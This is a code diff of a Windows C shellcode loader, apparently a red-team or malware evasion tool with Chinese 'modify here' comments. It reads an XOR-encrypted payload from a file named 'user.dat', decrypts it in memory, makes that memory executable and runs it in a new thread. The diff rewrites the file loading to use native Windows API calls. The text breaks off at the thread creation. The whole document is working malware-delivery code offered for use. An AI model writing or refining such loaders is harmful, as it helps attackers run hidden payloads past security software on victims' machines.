@@ -1,7 +1,4 @@
 #include <Windows.h>
-#include <stdio.h>
-
-#pragma warning(disable:4996)
 
 void XOR(char* data, size_t data_len, char* key, size_t key_len) {
 	int j;
@@ -17,33 +14,36 @@ void XOR(char* data, size_t data_len, char* key, size_t key_len) {
 
 int main() {
 
-	FILE* fp;
-	SIZE_T size;
-	unsigned char* buf;
-
 	void* exec_mem;
 	BOOL rv;
 	HANDLE th;
-	DWORD oldprotect = 0;
+	HANDLE hFile = NULL;
+	LARGE_INTEGER fileSize = { 0 };
+	DWORD bytesRead = NULL;
+	DWORD oldprotect = NULL;
+
 	//修改这里
 	char key[] = "key";
 
 	//修改这里
-	fp = fopen("user.dat", "rb");
-	fseek(fp, 0, SEEK_END);
-	size = ftell(fp);
-	fseek(fp, 0, SEEK_SET);
-	buf = (unsigned char*)malloc(size);
+	hFile = CreateFileA("user.dat", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) {
+		return -1;
+	}
 
-	fread(buf, size, 1, fp);
+	if (GetFileSizeEx(hFile, &fileSize) == 0) {
+		return -1;
+	}
 
-	exec_mem = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	exec_mem = VirtualAlloc(0, fileSize.LowPart, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-	XOR((char*)buf, size, key, sizeof(key));
+	if (!ReadFile(hFile, exec_mem, fileSize.LowPart, &bytesRead, NULL)) {
+		return -1;
+	}
 
-	RtlMoveMemory(exec_mem, buf, size);
+	XOR((char*)exec_mem, fileSize.LowPart, key, sizeof(key));
 
-	rv = VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &oldprotect);
+	rv = VirtualProtect(exec_mem, fileSize.LowPart, PAGE_EXECUTE_READ, &oldprotect);
 
 	if (rv != 0) {
 		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
